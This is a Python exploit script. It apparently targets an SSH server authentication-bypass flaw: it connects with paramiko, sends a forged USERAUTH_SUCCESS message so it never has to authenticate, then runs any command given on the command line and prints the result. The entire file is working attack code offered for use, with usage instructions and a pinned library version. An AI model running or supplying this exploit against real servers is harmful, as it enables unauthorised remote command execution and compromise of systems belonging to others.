#!/usr/bin/env python3
import sys
import paramiko
import socket
import logging

# pip3 install paramiko==2.0.8

logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
bufsize = 2048

def execute(hostname, port, command):
    sock = socket.socket()
    try:
        logging.debug("Connecting to %s:%s", hostname, port)
        sock.connect((hostname, int(port)))

        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        logging.debug("Sending USERAUTH_SUCCESS message")
        message = paramiko.message.Message()
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        client = transport.open_session(timeout=10)
        logging.debug("Executing command: %s", command)
        client.exec_command(command)

        stdout = client.makefile("rb", bufsize)
        stderr = client.makefile_stderr("rb", bufsize)

        output = stdout.read()
        error = stderr.read()

        stdout.close()
        stderr.close()
        transport.close()

        return (output + error).decode()
    except paramiko.SSHException as e:
        logging.exception("SSHException: %s", e)
        logging.debug("TCPForwarding disabled on remote server or other SSH error. Not Vulnerable.")
    except socket.error as e:
        logging.exception("Socket error: %s", e)
        logging.debug("Unable to connect.")
    finally:
        try:
            sock.close()
        except Exception as e:
            logging.exception("Exception while closing socket: %s", e)

    return None

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <hostname> <port> <command>")
        sys.exit(1)

    result = execute(sys.argv[1], sys.argv[2], sys.argv[3])
    if result:
        print(result)
    else:
        print("No output returned or failed to execute command")
